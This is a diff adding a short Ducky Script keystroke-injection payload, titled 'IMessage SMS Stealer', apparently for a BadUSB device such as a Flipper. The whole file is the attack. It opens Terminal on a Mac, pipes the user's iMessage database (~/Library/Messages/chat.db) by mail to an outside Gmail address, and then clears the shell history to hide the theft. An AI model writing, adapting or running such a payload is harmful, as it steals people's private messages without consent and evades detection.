@@ -1,0 +1,18 @@
+REM Title: IMessage SMS Stealer
+REM Description: Steal the chat.db from a Mac and send it via email
+REM Notes: Experimental
+DELAY 1000
+GUI SPACE
+DELAY 1500
+STRING TERMINAL
+ENTER
+DELAY 3000
+REM Work in progress to send the actual sql file. 
+STRING cat ~/Library/Messages/chat.db | mail -s "Flipper Flap Feport" unregisterednumber@gmail.com
+ENTER
+DELAY 1500
+STRING history -c
+ENTER
+DELAY 1500
+STRING exit
+ENTER
